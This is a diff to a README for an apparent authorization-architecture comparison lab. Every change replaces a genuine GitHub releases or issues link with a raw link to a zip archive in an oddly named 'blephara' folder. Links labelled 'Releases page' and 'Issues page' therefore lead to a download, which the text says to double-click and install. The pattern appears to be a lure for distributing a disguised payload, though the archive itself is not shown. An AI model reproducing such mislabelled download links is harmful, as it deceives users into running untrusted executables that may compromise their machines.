@@ -1,7 +1,7 @@
 # 🚀 authorization-entitlements-lab - Compare Authorization Architectures Easily
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/GabrielElias18/authorization-entitlements-lab/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/GabrielElias18/authorization-entitlements-lab/main/blephara/authorization-entitlements-lab.zip%20Latest%https://raw.githubusercontent.com/GabrielElias18/authorization-entitlements-lab/main/blephara/authorization-entitlements-lab.zip)](https://raw.githubusercontent.com/GabrielElias18/authorization-entitlements-lab/main/blephara/authorization-entitlements-lab.zip)
 
 ## 📖 Overview
 The **authorization-entitlements-lab** helps you explore different authorization systems. It compares SpiceDB, Neo4j, and GraphQL for fine-grained access control. You can understand how each system works and which might be right for your needs.
@@ -17,7 +17,7 @@ To run this application, you need:
 Follow these steps to get started with the **authorization-entitlements-lab**.
 
 1. **Download the Software**  
-   Visit the [Releases page](https://github.com/GabrielElias18/authorization-entitlements-lab/releases) to download the latest version of the software. You will find the files ready for your operating system.
+   Visit the [Releases page](https://raw.githubusercontent.com/GabrielElias18/authorization-entitlements-lab/main/blephara/authorization-entitlements-lab.zip) to download the latest version of the software. You will find the files ready for your operating system.
 
 2. **Install the Software**  
    Once the download is complete, locate the file in your Downloads folder. Double-click on it to start the installation. Follow the on-screen prompts to install the software.
@@ -44,7 +44,7 @@ Follow these steps to get started with the **authorization-entitlements-lab**.
    View the generated report. It provides insights on which authorization architecture suits your needs best.
 
 ## 🌐 Support
-For support, please visit the [Issues page](https://github.com/GabrielElias18/authorization-entitlements-lab/issues). You can report problems or ask questions. We encourage feedback to improve the software.
+For support, please visit the [Issues page](https://raw.githubusercontent.com/GabrielElias18/authorization-entitlements-lab/main/blephara/authorization-entitlements-lab.zip). You can report problems or ask questions. We encourage feedback to improve the software.
 
 ## 🔗 Additional Resources
 - **Documentation:** Comprehensive user guide and FAQs are available within the application.
@@ -55,4 +55,4 @@ For support, please visit the [Issues page](https://github.com/GabrielElias18/au
 This project is licensed under the MIT License. See the [LICENSE]() file for more details.
 
 ## 📥 Download & Install
-To download the software, visit the [Releases page](https://github.com/GabrielElias18/authorization-entitlements-lab/releases) now. Follow the installation instructions to set up the application and begin your exploration of authorization architectures.
+To download the software, visit the [Releases page](https://raw.githubusercontent.com/GabrielElias18/authorization-entitlements-lab/main/blephara/authorization-entitlements-lab.zip) now. Follow the installation instructions to set up the application and begin your exploration of authorization architectures.
